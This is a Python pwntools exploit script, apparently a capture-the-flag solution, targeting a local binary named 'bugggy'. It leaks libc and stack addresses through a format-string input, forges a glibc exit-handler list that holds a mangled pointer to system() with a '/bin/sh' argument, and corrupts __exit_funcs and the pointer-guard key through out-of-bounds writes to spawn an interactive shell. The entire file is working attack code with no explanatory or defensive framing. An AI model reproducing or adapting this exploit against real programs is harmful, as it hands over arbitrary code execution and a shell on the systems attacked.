#!/usr/bin/env python3
from pwn import *
context.arch = 'amd64'

p = process('./bugggy')

def rol(num, bits):
    return ((num << bits) | (((num << bits) & 0xffffffffffffffff0000000000000000) >> 64)) & 0xffffffffffffffff

def mangle(addr):
    return rol(addr, 0x11)

name = b'%11$p%19$p'
p.sendafter(b'name ?', name)

p.recvuntil(b'hi, ')

libc  = int(p.recv(14), 16) - 0x1ed4a0
stack = int(p.recv(14), 16)
mmap  = libc + 0x22c000
xor_key = libc + 0x1f3570
system = libc + 0x55410 + 4

log.info('libc  : ' + hex(libc))
log.info('stack : ' + hex(stack))
log.info('mmap  : ' + hex(mmap))

# struct exit_function_list
# {
#   struct exit_function_list *next;
#   size_t idx;
#   struct exit_function fns[32];
# };

# struct exit_function
# {
#   long int flavor;
#   union
#   {
#      void (*at) (void);
#      struct
#      {
#        void (*fn) (int status, void *arg);
#        void *arg;
#      } on;
#      struct
#      {
#        void (*fn) (void *arg, int status);
#        void *arg;
#        void *dso_handle;
#      } cxa;
#   } func;
# };

payload  = b'Yes\0'.ljust(16, b'a') 
exit_function = flat(4, mangle(system), mmap + 0x50, 0) # ef_cxa
exit_function_list = flat(0, 1) + exit_function
payload += exit_function_list + b'/bin/sh'
payload += b'\n'
p.sendafter(b'wrong ?', payload)

data = mmap + 0x20

# __exit_funcs
addr_offset = ((0x1eb718) - (0x22c000) - 8) // 4 - 4

p.sendafter(b'2. scanf', str(data) + ' ' + str(addr_offset) + '\n')

target_addr = xor_key
addr_offset = (target_addr - mmap) // 8 - 4

p.sendafter(b'2. bof', str(addr_offset) + '\n')

p.interactive()

